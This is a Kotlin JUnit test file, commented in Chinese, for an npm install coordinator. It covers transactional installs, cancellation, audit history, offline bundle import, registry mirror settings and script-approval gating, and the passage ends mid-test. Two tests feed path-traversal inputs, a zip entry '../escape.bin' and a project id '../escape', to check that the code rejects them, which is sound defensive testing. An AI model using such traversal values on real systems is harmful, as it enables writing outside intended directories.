package com.autoscript.appservice.npm

import javax.crypto.spec.SecretKeySpec
import com.autoscript.domain.core.AutojsException
import com.autoscript.domain.core.ErrorCode
import com.autoscript.domain.scripts.ScriptPaths
import com.autoscript.domain.npm.ApprovalAction
import com.autoscript.domain.npm.NpmRegistryKeys
import com.autoscript.domain.npm.NpmConsoleLineKind
import com.autoscript.domain.npm.ApprovalDecision
import com.autoscript.domain.npm.ApprovalStatus
import com.autoscript.domain.npm.InstallEvent
import com.autoscript.domain.npm.InstallFlags
import com.autoscript.domain.npm.PackageSpec
import com.autoscript.domain.npm.InstallHandle
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withTimeout
import kotlinx.coroutines.yield
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertFalse
import org.junit.jupiter.api.Assertions.assertNotNull
import org.junit.jupiter.api.Assertions.assertNull
import org.junit.jupiter.api.Assertions.assertThrows
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test
import org.junit.jupiter.api.io.TempDir
import java.nio.file.Files
import java.nio.file.Path
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class InstallCoordinatorTest {

    @TempDir
    lateinit var dir: Path

    /** 交叉校验断言里用的占位 integrity（真形状由 NpmRegistryVerifierTest 管）。 */
    private val I = "sha512-" + "a".repeat(24)

    /** T1 记录式执行体收到的 ScriptOp（每条用例各自断言，故是类级共享记录面）。 */
    private val scriptOps = mutableListOf<ScriptOp>()

    private val layout get() = NpmProjectLayout(ScriptPaths.projectsRoot(dir))
    private val journal get() = InstallJournal(dir.resolve(".autojs"))
    private val staging get() = InstallStaging(layout)
    private val ledger get() = ApprovalLedger()

    /** 假执行体：在暂存目录写包内容，模拟 reify 产物。 */
    private class FakeExecutor(
        val block: suspend (HeavyOp) -> Unit = {},
    ) : HeavyOpExecutor {
        val calls = mutableListOf<HeavyOp>()
        override suspend fun execute(op: HeavyOp, sink: ProgressSink): HeavyOpOutcome {
            calls += op
            block(op)
            // 带上 outputTail：控制台那条链（§10.9 第 3 条）要它，返回 null 会让
            // 「没有捕获到命令输出」把真正的输出盖掉。
            return HeavyOpOutcome("ok:${op.args.first()}", "npm output for ${op.args.first()}")
        }
    }

    /**
     * 会 harvest 的假执行体：除 reify 产物外，还按 work-prefix 模型第 3 步把
     * `package.json` + `package-lock.json` 写回项目根（HostNodeExecutor 的真实行为）。
     * 只有承认这个前提，install 后的 lock 验签/快照导出才有对象可测。
     */
    private fun harvesting(vararg deps: Pair<String, String>): HeavyOpExecutor =
        object : HeavyOpExecutor {
            override suspend fun execute(op: HeavyOp, sink: ProgressSink): HeavyOpOutcome {
                for ((name, version) in deps) {
                    val p = op.stageDir.resolve(name)
                    Files.createDirectories(p)
                    Files.write(p.resolve("package.json"), ("""{"name":"$name","version":"$version"}""").toByteArray())
                    Files.write(p.resolve("index.js"), ("module.exports = {}\n").toByteArray())
                }
                val depJson = deps.joinToString(",") { (n, v) -> "\"$n\":\"$v\"" }
                val lockJson = deps.joinToString(",") { (n, v) -> "\"node_modules/$n\":{\"version\":\"$v\",\"integrity\":\"sha512-x\"}" }
                Files.write(op.projectRoot.resolve("package.json"), ("""{"name":"p1","version":"1.0.0","dependencies":{""" + depJson + """}}""").toByteArray())
                Files.write(op.projectRoot.resolve("package-lock.json"), ("""{"lockfileVersion":3,"packages":{"":{},""" + lockJson + """}}""").toByteArray())
                return HeavyOpOutcome("ok:" + op.args.first(), "npm output for ${op.args.first()}")
            }
        }

    private fun newHistory() = InstallHistory(dir.resolve(".autojs"))

    /** 造一个 bundle zip：entries = (path, bytes)。 */
    private fun bundleZip(vararg entries: Pair<String, ByteArray>): Path {
        val zip = dir.resolve("bundle-${System.nanoTime()}.zip")
        ZipOutputStream(Files.newOutputStream(zip)).use { z ->
            for ((name, data) in entries) {
                z.putNextEntry(ZipEntry(name)); z.write(data); z.closeEntry()
            }
        }
        return zip
    }

    /** content-v2 路径段（同 cacache hash-to-segments）。 */
    private fun segments(bytes: ByteArray): String {
        val hex = DirSizer.sha512(bytes)
        return "${hex.substring(0, 2)}/${hex.substring(2, 4)}/${hex.substring(4)}"
    }

    /** 未注入 npmCacheDir 时协调器退到 projectsRoot 同级 `.npm-cache`（可断言、不猜）。 */
    private fun cacheDir(): Path = dir.resolve(".npm-cache")

    private fun sha512Segments(payload: ByteArray): String {
        val hex = DirSizer.sha512(payload)
        return "sha512/${hex.substring(0, 2)}/${hex.substring(2, 4)}/${hex.substring(4)}"
    }

    private fun snapshots(key: LockSigner.KeyProvider = LockSigner.KeyProvider { SecretKeySpec("test-app-key-32bytes-aaaaaaaaaaaa".toByteArray(), "HmacSHA256") }) =
        NpmSnapshot(layout, dir.resolve(".autojs"), key)

    private fun coordinator(
        executor: HeavyOpExecutor = FakeExecutor(),
        free: Long = 10L * 1024 * 1024 * 1024,
        cache: CacheIndex = CacheIndex { false },
        ledger: ApprovalLedger = ApprovalLedger(),
        history: InstallHistory? = newHistory(),
        lockSigner: LockSigner? = null,
        snapshots: NpmSnapshot? = null,
        bundleImporter: NpmOfflineBundleImporter? = null,
        registryVerifier: RegistryVerifier? = null,
        /**
         * 真校验器接上装路径（`:app-service:npm`）：两镜像声明比对 → 三分裁决 → 处置。
         * null = 走 InstallCoordinator 自己的缺省（读项目 npmrc 的 registry=）。
         */
        registryOf: ((String) -> String?)? = null,
        /** T1 lifecycle 执行体（null = 缺省 [ScriptOpExecutor.Unavailable]，即"门禁过了也跑不起来"）。 */
        script: ScriptOpExecutor? = null,
        /** 时钟（尺寸缓存的 TTL 判定读它；不注入则走真实时间）。 */
        now: () -> Long = { System.currentTimeMillis() },
        /** 全局镜像源（§10.2 userconfig 层）；null = 未接线，解析链退到项目 .npmrc → null。 */
        globalConfig: NpmGlobalConfig? = null,
    ) = InstallCoordinator(
        services = NpmServices(
            layout = layout,
            journal = journal,
            staging = staging,
            ledger = ledger,
            history = history,
            lockSigner = lockSigner,
            snapshots = snapshots,
            cacheIndex = cache,
            bundleImporter = bundleImporter,
            registryVerifier = registryVerifier,
        ),
        executor = executor,
        now = now,
        freeSpaceProbe = { free },
        registryOf = registryOf,
        globalConfig = globalConfig,
        scriptExecutor = script ?: ScriptOpExecutor.Unavailable,
    )

    /**
     * 裁决假源：按包名查表，并把「被问过什么、首选注册表给了什么」记下来。
     *
     * 记 [asked] 是这条链路的双断言点：一是别把版本猜成 latest 才去问（要原样问），
     * 二是首选注册表必须由调用方喂（不许校验器拿自己的默认去比，§10.5-1）。
     */
    private class FakeVerifier(private val verdicts: Map<String, NpmRegistryVerifier.Verdict>) : RegistryVerifier {
        val asked = mutableListOf<Triple<String, String?, String?>>()
        override fun verify(name: String, version: String?, primary: String?): NpmRegistryVerifier.Verdict {
            asked += Triple(name, version, primary)
            return verdicts[name] ?: error("未预期的校验请求：$name@$version")
        }
    }

    /** 一份合法极简 packument（只有一个版本，dist.integrity 由参数定）。 */
    private fun packumentJson(version: String, integrity: String): String =
        """{"dist-tags":{"latest":"$version"},"versions":{"$version":{"version":"$version","dist":{"tarball":"https://registry.example/axios/-/axios-$version.tgz","integrity":"$integrity"}}}}"""

    /** 两镜像给同一份声明的假源（真 verifier 的 RegistrySource 缝，零网络）。 */
    private fun agreeingSource(integrity: String, version: String = "1.7.0") =
        NpmRegistryVerifier(source = object : NpmRegistryVerifier.RegistrySource {
            override fun packument(registryBase: String, escapedName: String): String = packumentJson(version, integrity)
        })

    /** 两镜像各说各话的假源（按 host 分两份声明）。 */
    private fun disagreeingSource(mirrorIntegrity: String, officialIntegrity: String, version: String = "1.7.0") =
        NpmRegistryVerifier(source = object : NpmRegistryVerifier.RegistrySource {
            override fun packument(registryBase: String, escapedName: String): String =
                packumentJson(version, if (registryBase.contains("npmjs.org")) officialIntegrity else mirrorIntegrity)
        })

    // ═══ 门禁 ═══

    @Test
    fun `git 依赖入口即拒 ERR_NOT_SUPPORTED`() = runBlocking {
        val c = coordinator()
        val ex = assertThrows(AutojsException::class.java) {
            runBlocking {
                c.install("p1", listOf(PackageSpec("foo", "git+https://x.git")))
            }
        }
        assertEquals(ErrorCode.ERR_NOT_SUPPORTED, ex.error)
        assertTrue(ex.message!!.contains("importTarball"), "必须给可操作引导")
    }

    @Test
    fun `磁盘不足预检拦截 ERR_DISK_FULL`() = runBlocking {
        val c = coordinator(free = 100L * 1024 * 1024)
        val ex = assertThrows(AutojsException::class.java) {
            runBlocking { c.install("p1", listOf(PackageSpec("axios"))) }
        }
        assertEquals(ErrorCode.ERR_DISK_FULL, ex.error)
    }

    @Test
    fun `非法 projectId 拒绝（防路径逃逸）`() = runBlocking {
        val c = coordinator()
        assertThrows(IllegalArgumentException::class.java) {
            runBlocking { c.install("../escape", listOf(PackageSpec("x"))) }
        }
        Unit
    }

    // ═══ 事务化编排 ═══

    @Test
    fun `成功安装：journal begin+commit 成对 且产物原子落位`() = runBlocking {
        val exec = FakeExecutor { op ->
            Files.write(op.stageDir.resolve("axios.js"), ("console.log(1)").toByteArray())
        }
        val c = coordinator(executor = exec)
        c.install("p1", listOf(PackageSpec("axios", "1.7.0")))

        val entries = journal.all()
        assertEquals(listOf(InstallJournal.State.BEGIN, InstallJournal.State.COMMIT), entries.map { it.state })
        assertTrue(journal.unfinished().isEmpty())
        // 产物已从 node_modules.part-* rename 到 node_modules
        assertTrue(Files.exists(layout.nodeModules("p1").resolve("axios.js")))
        // 暂存目录不残留
        assertFalse(Files.exists(layout.projectRoot("p1").resolve(entries.first().stageDir)))
    }

    @Test
    fun `执行失败：journal fail + 暂存残骸清扫 + node_modules 不被污染`() = runBlocking {
        Files.createDirectories(layout.nodeModules("p1"))
        Files.write(layout.nodeModules("p1").resolve("old.js"), ("old").toByteArray())
        val exec = FakeExecutor { throw RuntimeException("registry 502") }
        val c = coordinator(executor = exec)

        assertThrows(RuntimeException::class.java) {
            runBlocking { c.install("p1", listOf(PackageSpec("axios"))) }
        }
        assertEquals(InstallJournal.State.FAIL, journal.all().last().state)
        assertTrue(journal.unfinished().isEmpty(), "fail 封口后不再是未完成事务")
        // 旧 node_modules 原样保留（墓碑回滚）
        assertEquals("old", String(Files.readAllBytes(layout.nodeModules("p1").resolve("old.js")), Charsets.UTF_8))
        // 暂存目录被清扫
        assertTrue(Files.list(layout.projectRoot("p1")).noneMatch { it.fileName.toString().startsWith("node_modules.part-") })
    }

    @Test
    fun `取消：journal fail + 事件 Finished(success=false)`() = runBlocking {
        val gate = kotlinx.coroutines.CompletableDeferred<Unit>()
        val exec = FakeExecutor { gate.await() }   // 挂起直到放行
        val c = coordinator(executor = exec)
        val events = mutableListOf<InstallEvent>()
        val collect = launch { c.progress("p1").collect { events += it } }

        val job = launch {
            runCatching { c.install("p1", listOf(PackageSpec("axios"))) }
        }
        // 等到执行体卡在 gate 上，再从句柄账里取消
        kotlinx.coroutines.delay(200)
        val tracked = cHandles(c).values.single()
        val handleField = tracked.javaClass.getDeclaredField("handle").apply { isAccessible = true }
        val handle = handleField.get(tracked) as com.autoscript.domain.npm.InstallHandle
        c.cancel(handle)
        gate.complete(Unit)
        job.join()
        collect.cancel()

        assertEquals(InstallJournal.State.FAIL, journal.all().lastOrNull()?.state)
        assertTrue(events.filterIsInstance<InstallEvent.Finished>().any { !it.success })
    }

    @Test
    fun `句柄账与项目锁在终态即逐出（长跑不涨）`() = runBlocking {
        val c = coordinator()
        c.install("p1", listOf(PackageSpec("axios")))
        c.install("p2", listOf(PackageSpec("axios")))
        assertTrue(cHandles(c).isEmpty(), "安装结束的句柄仍留在账上：${cHandles(c).keys}")
        assertTrue(cProjectLocks(c).isEmpty(), "项目锁用完没摘：${cProjectLocks(c).keys}")

        // 失败路径同样收口（不留残迹才算收口）
        val bad = coordinator(executor = FakeExecutor { throw IllegalStateException("boom") })
        runCatching { bad.install("p1", listOf(PackageSpec("axios"))) }
        assertTrue(cHandles(bad).isEmpty() && cProjectLocks(bad).isEmpty(), "失败路径留了残迹")

        // 取消路径同样收口
        val gate = CompletableDeferred<Unit>()
        val cancelling = coordinator(executor = FakeExecutor { gate.await() })
        val job = launch { runCatching { cancelling.install("p1", listOf(PackageSpec("axios"))) } }
        withTimeout(5_000) { while (cHandles(cancelling).isEmpty()) yield() }
        val tracked = cHandles(cancelling).values.single()
        val hf = tracked.javaClass.getDeclaredField("handle").apply { isAccessible = true }
        cancelling.cancel(hf.get(tracked) as InstallHandle)
        gate.complete(Unit)
        job.join()
        assertTrue(cHandles(cancelling).isEmpty() && cProjectLocks(cancelling).isEmpty(), "取消路径留了残迹")
    }

    @Test
    fun `外层取消安装仍清理事务和句柄并原样传播`() = runBlocking {
        val cancel = kotlinx.coroutines.CancellationException("cancel install")
        val c = coordinator(executor = FakeExecutor { throw cancel })
        val thrown = assertThrows(kotlinx.coroutines.CancellationException::class.java) {
            runBlocking { c.install("p1", listOf(PackageSpec("axios"))) }
        }
        assertEquals(cancel.message, thrown.message)
        assertTrue(cHandles(c).isEmpty())
        assertTrue(cProjectLocks(c).isEmpty())
        assertTrue(journal.unfinished().isEmpty())
        val finals = c.drainEvents("p1", 0, 32).events.map { it.event }.filterIsInstance<InstallEvent.Finished>()
        assertEquals(1, finals.size)
        assertEquals("已取消", finals.single().detail)
    }

    @Test
    fun `外层取消 T1 不造事务且句柄清理完成`() = runBlocking {
        val cancel = kotlinx.coroutines.CancellationException("cancel script")
        val led = ApprovalLedger()
        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc"}}""")
        approveRunScript(led, "p1", "build")
        val c = coordinator(ledger = led, script = object : ScriptOpExecutor {
            override suspend fun execute(op: ScriptOp, sink: ProgressSink): String { throw cancel }
        })
        val thrown = assertThrows(kotlinx.coroutines.CancellationException::class.java) {
            runBlocking { c.runScript("p1", "build") }
        }
        assertEquals(cancel.message, thrown.message)
        assertTrue(cHandles(c).isEmpty())
        assertTrue(cProjectLocks(c).isEmpty())
        assertTrue(journal.all().isEmpty())
        val finals = c.drainEvents("p1", 0, 32).events.map { it.event }.filterIsInstance<InstallEvent.Finished>()
        assertEquals(1, finals.size)
        assertEquals("已取消", finals.single().detail)
    }

    @Test
    fun `等待项目锁时取消不造无起点事务`() = runBlocking {
        val gate = CompletableDeferred<Unit>()
        val firstEntered = CompletableDeferred<Unit>()
        val c = coordinator(executor = FakeExecutor {
            firstEntered.complete(Unit)
            gate.await()
        })
        val first = async { c.install("p1", listOf(PackageSpec("axios"))) }
        withTimeout(5_000) { firstEntered.await() }
        val waiting = async { c.install("p1", listOf(PackageSpec("dayjs"))) }
        withTimeout(5_000) { while (cHandles(c).size < 2) yield() }
        waiting.cancel()
        waiting.join()
        assertTrue(waiting.isCancelled)
        gate.complete(Unit)
        first.await()

        assertTrue(cHandles(c).isEmpty())
        assertTrue(cProjectLocks(c).isEmpty())
        assertEquals(listOf(InstallJournal.State.BEGIN, InstallJournal.State.COMMIT), journal.all().map { it.state })
        val terminal = c.drainEvents("p1", 0, 32).events.map { it.event }.filterIsInstance<InstallEvent.Finished>()
        assertEquals(2, terminal.size)
        assertEquals(1, terminal.count { !it.success && it.detail == "已取消" })
    }

    @Test
    fun `同一项目的并发安装不重入（per-project 锁原子入表）`() = runBlocking {
        val inflight = java.util.concurrent.atomic.AtomicInteger()
        val peak = java.util.concurrent.atomic.AtomicInteger()
        val exec = object : HeavyOpExecutor {
            override suspend fun execute(op: HeavyOp, sink: ProgressSink): HeavyOpOutcome {
                val now = inflight.incrementAndGet()
                peak.updateAndGet { maxOf(it, now) }
                delay(50)
                inflight.decrementAndGet()
                return HeavyOpOutcome("ok")
            }
        }
        val c = coordinator(executor = exec)
        (1..6).map { launch { runCatching { c.install("p1", listOf(PackageSpec("axios"))) } } }.forEach { it.join() }
        assertEquals(1, peak.get(), "同一项目出现并行安装：per-project 锁没生效")
    }

    // ═══ 审计史（§10.2 install-history） ═══

    @Test
    fun `带 install 脚本的包装完发 SCRIPTS_SKIPPED 显式警告（禁止静默）`() = runBlocking {
        // T0 契约全程 --ignore-scripts：脚本必然没跑，必须显式告知而不是假装无事
        val exec = FakeExecutor { op ->
            val pkg = op.stageDir.resolve("esbuild")
            Files.createDirectories(pkg)
            Files.write(pkg.resolve("package.json"), ("""{"name":"esbuild","version":"0.19.0","scripts":{"postinstall":"node install.js"}}""").toByteArray())
        }
        val c = coordinator(executor = exec)
        val events = mutableListOf<InstallEvent>()
        val collect = launch { c.progress("p1").collect { events += it } }
        kotlinx.coroutines.delay(50)   // 先让收集协程就位（否则事件在订阅前就发完）
        c.install("p1", listOf(PackageSpec("esbuild", "0.19.0")))
        kotlinx.coroutines.delay(50)   // 让缓冲事件被收集协程排干（SharedFlow replay=0）
        collect.cancel()

        val ws = events.filterIsInstance<InstallEvent.Warning>().filter { it.kind == InstallEvent.Kind.SCRIPTS_SKIPPED }
        assertTrue(ws.isNotEmpty(), "必须发 SCRIPTS_SKIPPED（–ignore-scripts 的静默面，§10.5-3）")
        assertEquals(listOf("esbuild"), ws.single().pkgs, "警告须点名具体包（UI 才能显示哪些没跑）")
        // 安装本身仍成功（T0 契约：--ignore-scripts 不阻塞安装）
        assertTrue(events.filterIsInstance<InstallEvent.Finished>().any { it.success })
    }

    @Test
    fun `无 install 脚本包不发 SCRIPTS_SKIPPED（不制造噪音警告）`() = runBlocking {
        val exec = FakeExecutor { op ->
            val pkg = op.stageDir.resolve("lodash")
            Files.createDirectories(pkg)
            Files.write(pkg.resolve("package.json"), ("""{"name":"lodash","version":"4.17.21","scripts":{"test":"echo x"}}""").toByteArray())
        }
        val c = coordinator(executor = exec)
        val events = mutableListOf<InstallEvent>()
        val collect = launch { c.progress("p1").collect { events += it } }
        c.install("p1", listOf(PackageSpec("lodash", "4.17.21")))
        kotlinx.coroutines.delay(50)
        collect.cancel()
        assertTrue(events.filterIsInstance<InstallEvent.Warning>().none { it.kind == InstallEvent.Kind.SCRIPTS_SKIPPED },
            "test 脚本不算 install-scripts，不该误报")
    }

    @Test
    fun `成功安装入史：op 名取 npm 子命令`() = runBlocking {
        val exec = FakeExecutor { op ->
            Files.write(op.stageDir.resolve("axios.js"), ("console.log(1)").toByteArray())
        }
        val h = newHistory()
        coordinator(executor = exec, history = h).install("p1", listOf(PackageSpec("axios", "1.7.0")))
        val e = h.all().single()
        assertEquals(InstallHistory.Op.INSTALL, e.op)
        assertEquals("p1", e.projectId)
        assertTrue(e.success, "成功安装必须如实入史")
    }

    @Test
    fun `失败安装也入史（审计不能只答成功面）`() = runBlocking {
        val h = newHistory()
        val exec = FakeExecutor { throw RuntimeException("registry 502") }
        assertThrows(RuntimeException::class.java) {
            runBlocking { coordinator(executor = exec, history = h).install("p1", listOf(PackageSpec("axios"))) }
        }
        val e = h.all().single()
        assertEquals(InstallHistory.Op.INSTALL, e.op)
        assertTrue(!e.success, "失败也要入史")
        assertTrue(e.detail?.contains("registry 502") == true, "失败明细必须带得上：${e.detail}")
    }

    @Test
    fun `tarball 导入归并为 import op（路径只进 detail）`() = runBlocking {
        val h = newHistory()
        val exec = FakeExecutor { /* 假执行 */ }
        coordinator(executor = exec, history = h)
            .importTarball("p1", "/sdcard/Download/pkg.tgz")
        val e = h.all().single()
        assertEquals(InstallHistory.Op.IMPORT, e.op, "导入统一归 import（用户路径不是 op 名）")
        assertTrue(e.success)
    }

    @Test
    fun `bundle 导入：未注入导入件如实失败（不拼 npm 不认识的旗标）`() = runBlocking {
        val c = coordinator()   // bundleImporter 缺省 null
        val e = assertThrows(AutojsException::class.java) { runBlocking { c.importOfflineBundle("p1", "/sdcard/x.zip") } }
        assertEquals(ErrorCode.ERR_NOT_IMPLEMENTED, e.error)
    }

    @Test
    fun `bundle 导入：合入缓存后按 lock 离线重建（导入 != 安装）`() = runBlocking {
        val payload = "bundle-tarball".toByteArray()
        val zip = bundleZip("_cacache/content-v2/sha512/" + segments(payload) to payload)
        val h = newHistory()
        val exec = FakeExecutor { }
        val c = coordinator(
            executor = exec,
            history = h,
            bundleImporter = NpmOfflineBundleImporter,
        )
        c.importOfflineBundle("p1", zip.toString())

        // 1) bundle 内容进了缓存（导入侧真做事，不是把 uri 抛给 npm）
        val cacheDir = cacheDir()
        assertTrue(Files.isRegularFile(cacheDir.resolve("_cacache/content-v2/sha512/" + segments(payload))))
        // 2) 随后走正规事务链：ci --offline（不是「解压即算装上」）
        assertEquals(listOf("ci", "--offline"), exec.calls.single().args)
        // 3) 成败都入史：合入与重建各一条 import/ci
        assertEquals(
            listOf(InstallHistory.Op.IMPORT, "ci"),
            h.all().map { it.op },
        )
        assertTrue(h.all().all { it.success })
    }

    @Test
    fun `bundle 导入：有条目被拒则如实入史（不静默整包导入）`() = runBlocking {
        val honest = "honest".toByteArray()
        val zip = bundleZip(
            ("_cacache/content-v2/sha512/" + segments(honest)) to honest,
            "../escape.bin" to "pwned".toByteArray(),
        )
        val h = newHistory()
        val c = coordinator(executor = FakeExecutor { }, history = h, bundleImporter = NpmOfflineBundleImporter)
        c.importOfflineBundle("p1", zip.toString())
        val failed = h.all().first { !it.success }
        assertEquals(InstallHistory.Op.IMPORT, failed.op)
        assertTrue(failed.detail!!.contains("被拒"), "拒收必须点名：${failed.detail}")
    }

    @Test
    fun `bundle 导入：文件不存在 → ERR_FILE_NOT_FOUND（SAF 副本未着陆）`() = runBlocking {
        val c = coordinator(bundleImporter = NpmOfflineBundleImporter)
        val e = assertThrows(AutojsException::class.java) { runBlocking { c.importOfflineBundle("p1", "/sdcard/nope.zip") } }
        assertEquals(ErrorCode.ERR_FILE_NOT_FOUND, e.error)
    }

    @Test
    fun `bundle 导入：超上限 → ERR_INVALID_PARAM（「选错文件」不是「文件不见」）`() = runBlocking {
        // 造一个**真超顶**的包：cacache 内容寻址要求条目名 = 内容摘要，所以小载荷只能
        // 靠「很多条小条目」把整包撑过 512 MiB —— 那正是这条路径的真实形态
        // （用户从 Downloads 里挑了一个不是 bundle 的大 zip）。声明大小不是判据，
        // 判据是文件系统上的字节数，所以这里必须真写这么多字节。
        val blob = ByteArray(1 shl 20) { 3 }        // 1 MiB，可压缩性无关紧要（stored）
        val zip = dir.resolve("huge-bundle.zip")
        ZipOutputStream(Files.newOutputStream(zip)).use { z ->
            z.setLevel(java.util.zip.Deflater.NO_COMPRESSION)
            for (i in 0 until 513) {                // 513 × 1 MiB > 512 MiB 顶
                z.putNextEntry(ZipEntry("_cacache/content-v2/sha512/ff/ee/part-$i"))
                z.write(blob)
                z.closeEntry()
            }
        }
        assertTrue(Files.size(zip) > 512L * 1024 * 1024, "前提：包真的超顶")

        val h = newHistory()
        val c = coordinator(executor = FakeExecutor { }, history = h, bundleImporter = NpmOfflineBundleImporter)
        val e = assertThrows(AutojsException::class.java) {
            runBlocking { c.importOfflineBundle("p1", zip.toString()) }
        }
        assertEquals(ErrorCode.ERR_INVALID_PARAM, e.error, "超限是**参数**问题（去重选文件），不是找不到文件")
        assertTrue(e.message!!.contains("超过上限"), "原文（含实际字节数与上限）要保留给用户：${e.message}")
        val failed = h.all().single { !it.success }
        assertEquals(InstallHistory.Op.IMPORT, failed.op, "超限也要留痕")
    }

    @Test
    fun `registry 变更入史（可审计）`() = runBlocking {
        val h = newHistory()
        coordinator(history = h).config("p1", com.autoscript.domain.npm.NpmConfigKey.REGISTRY, "https://registry.npmjs.org")
        val e = h.all().single()
        assertEquals(InstallHistory.Op.REGISTRY, e.op)
        assertTrue(e.detail?.contains("registry=https://registry.npmjs.org") == true, "明细须含键值：${e.detail}")
    }

    // ═══ 全局镜像源（§10.9 第 8 条；2026-10-09 批 83） ═══

    @Test
    fun `全局镜像源未接线时如实回出厂缺省`() = runBlocking {
        val snap = coordinator().globalRegistry()
        assertNull(snap.configured, "没接线就是「没设过」，不许假装读到了空配置")
        assertEquals(NpmRegistryKeys.OFFICIAL, snap.effective)
        assertEquals(NpmRegistryKeys.MIRROR, snap.secondaryRegistry)
    }

    @Test
    fun `设全局镜像源后读回且入史`() = runBlocking {
        val h = newHistory()
        val c = coordinator(history = h, globalConfig = NpmGlobalConfig(dir))
        c.setGlobalRegistry("  https://registry.npmmirror.com/  ")
        assertEquals(
            "https://registry.npmmirror.com/",
            c.globalRegistry().configured,
            "去首尾空白后**原样**落盘：不做规整化，否则带 ?token= 的自建网关会被静默削掉凭据",
        )
        assertTrue(c.globalRegistry().customized)
        val e = h.all().single()
        assertEquals(InstallHistory.Op.REGISTRY, e.op)
        assertEquals("", e.projectId, "全局变更没有项目维度——空串是刻意的，不是漏填")
    }

    @Test
    fun `校验不过抛原文且不落盘`() = runBlocking {
        val c = coordinator(globalConfig = NpmGlobalConfig(dir))
        val bad = "http://registry.npmjs.org"
        val e = assertThrows(IllegalArgumentException::class.java) { runBlocking { c.setGlobalRegistry(bad) } }
        assertTrue(bad in (e.message ?: ""), "拒收原文必须点名用户输入的那个串：${e.message}")
        assertNull(c.globalRegistry().configured, "被拒的值不得落盘")
        assertFalse(Files.exists(NpmGlobalConfig(dir).file()), "连文件都不该被建出来")
    }

    @Test
    fun `空白输入是恢复出厂——删键而不是写空值`() = runBlocking {
        val c = coordinator(globalConfig = NpmGlobalConfig(dir))
        c.setGlobalRegistry("https://registry.npmmirror.com")
        assertTrue(c.globalRegistry().customized)
        c.setGlobalRegistry("   ")
        assertNull(c.globalRegistry().configured)
        assertFalse(
            Files.readAllLines(NpmGlobalConfig(dir).file()).any { it.startsWith("registry=") },
            "「恢复出厂」必须把行删掉",
        )
    }

    @Test
    fun `未接线时写全局镜像源抛而不是静默丢弃`() = runBlocking {
        val e = assertThrows(AutojsException::class.java) {
            runBlocking { coordinator().setGlobalRegistry("https://x.example.com") }
        }
        assertTrue("未接线" in (e.message ?: ""), "要说清为什么写不进去：${e.message}")
    }

    /** 永远回 Agreed 的假校验器（只关心它被问到的 primary）。 */
    private fun agreeingVerifier(): FakeVerifier = FakeVerifier(
        mapOf("dayjs" to NpmRegistryVerifier.Verdict.Agreed("dayjs", "1.11.23", I, "https://x.tgz", false)),
    )

    @Test
    fun `解析链两层——项目 npmrc 有则用项目，没有才落到全局`() = runBlocking {
        coordinator(globalConfig = NpmGlobalConfig(dir)).setGlobalRegistry("https://global.example.com")

        // 第一层缺席 → 落到全局那层
        val v1 = agreeingVerifier()
        coordinator(globalConfig = NpmGlobalConfig(dir), registryVerifier = v1)
            .install("p1", listOf(PackageSpec("dayjs", "1.11.23")))
        assertEquals("https://global.example.com", v1.asked.single().third, "项目 .npmrc 没有时用全局那层")

        // 第一层在场 → 项目赢（全局只做缺省，不顶掉项目级）
        Files.createDirectories(layout.projectRoot("p1"))
        Files.write(layout.npmrc("p1"), listOf("registry=https://project.example.com"))
        val v2 = agreeingVerifier()
        coordinator(globalConfig = NpmGlobalConfig(dir), registryVerifier = v2)
            .install("p1", listOf(PackageSpec("dayjs", "1.11.23")))
        assertEquals("https://project.example.com", v2.asked.single().third, "项目 .npmrc 覆盖全局")
    }

    @Test
    fun `两层都没设时交给校验器 null——由它用自己的出厂缺省`() = runBlocking {
        val v = agreeingVerifier()
        coordinator(globalConfig = NpmGlobalConfig(dir), registryVerifier = v)
            .install("p1", listOf(PackageSpec("dayjs", "1.11.23")))
        assertNull(v.asked.single().third, "两层都没设 = null（不是「猜一个镜像」）")
    }

    @Test
    fun `依赖面板快照不带镜像源——两者各走各的读口`() = runBlocking {
        // 依赖面板的 snapshot() 要遍历每个项目的 node_modules 算尺寸；镜像源管理页读一个
        // 键就够。把 registry 塞进那个 DTO 会让「打开镜像源页」付一次全项目遍历的代价，
        // 而它当前也没有消费方 —— 故镜像源只走 globalRegistry() 这一条口。
        val c = coordinator(globalConfig = NpmGlobalConfig(dir))
        c.setGlobalRegistry("https://registry.npmmirror.com")
        assertEquals("https://registry.npmmirror.com", c.globalRegistry().configured)
    }

    // ═══ 审批（人机分离） ═══

    @Test
    fun `审批：入队→PENDING→resolve 单向；同键重复入队合并`() = runBlocking {
        val c = coordinator()
        val t1 = c.requestApprove("p1", "esbuild", "sha512-a", ApprovalAction.INSTALL_SCRIPT)
        val t2 = c.requestApprove("p1", "esbuild", "sha512-a", ApprovalAction.INSTALL_SCRIPT)
        assertEquals(t1.requestId, t2.requestId, "同键 PENDING 请求必须合并")
        assertEquals(ApprovalStatus.PENDING, t1.status)
        assertEquals(1, c.pendingApprovals("p1").size)

        val resolved = c.resolveApproval(t1.requestId, ApprovalDecision.APPROVE)
        assertEquals(ApprovalStatus.APPROVED, resolved.status)
        assertTrue(c.pendingApprovals("p1").isEmpty())
        // 已决票不可改
        val again = c.resolveApproval(t1.requestId, ApprovalDecision.REJECT)
        assertEquals(ApprovalStatus.APPROVED, again.status)
    }

    @Test
    fun `版本升级 versionHash 变化 → 旧批准不再匹配`() = runBlocking {
        val led = ApprovalLedger()
        val c = coordinator(ledger = led)
        val t = c.requestApprove("p1", "esbuild", "sha512-v1", ApprovalAction.RUN_SCRIPT)
        c.resolveApproval(t.requestId, ApprovalDecision.APPROVE)
        assertTrue(led.isApproved("p1", "esbuild", "sha512-v1", ApprovalAction.RUN_SCRIPT))
        assertFalse(led.isApproved("p1", "esbuild", "sha512-v2", ApprovalAction.RUN_SCRIPT),
            "版本升级（hash 变化）必须重新审批")
    }

    // ═══ P1 T1：lifecycle 脚本放行门禁（§10.3 T1 + §18 第 7 项） ═══

    @Test
    fun `runScript 未获批：拒绝放行并把审批请求投进 approvals 流`() {
        val led = ApprovalLedger()
        val c = coordinator(ledger = led)
        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc"}}""")

